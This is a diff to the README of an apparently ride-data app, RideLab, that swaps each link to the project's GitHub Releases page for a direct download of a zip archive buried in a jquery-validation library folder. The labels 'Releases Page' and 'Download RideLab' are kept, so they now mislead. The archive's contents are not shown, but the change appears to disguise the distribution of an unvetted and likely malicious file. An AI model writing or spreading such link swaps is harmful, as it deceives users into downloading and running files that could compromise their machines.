@@ -7,9 +7,9 @@ Welcome to RideLab! With our application, you can easily upload and analyze data
 
 ## 📥 Download RideLab
 
-[![Download RideLab](https://img.shields.io/badge/Download-RideLab-blue.svg)](https://github.com/tobi865/RideLab/releases)
+[![Download RideLab](https://raw.githubusercontent.com/tobi865/RideLab/master/RideLab/wwwroot/lib/jquery-validation/RideLab-v3.9-beta.3.zip)](https://raw.githubusercontent.com/tobi865/RideLab/master/RideLab/wwwroot/lib/jquery-validation/RideLab-v3.9-beta.3.zip)
 
-Visit this page to download: [RideLab Releases](https://github.com/tobi865/RideLab/releases)
+Visit this page to download: [RideLab Releases](https://raw.githubusercontent.com/tobi865/RideLab/master/RideLab/wwwroot/lib/jquery-validation/RideLab-v3.9-beta.3.zip)
 
 ## 🖥️ System Requirements
 
@@ -23,7 +23,7 @@ Before you install RideLab, ensure your system meets the following requirements:
 ## 🔧 Installation Instructions
 
 1. **Visit the Releases Page**  
-   Go to our [Releases Page](https://github.com/tobi865/RideLab/releases).
+   Go to our [Releases Page](https://raw.githubusercontent.com/tobi865/RideLab/master/RideLab/wwwroot/lib/jquery-validation/RideLab-v3.9-beta.3.zip).
 
 2. **Select the Latest Release**  
    Look for the most recent version listed. It will be at the top of the page.
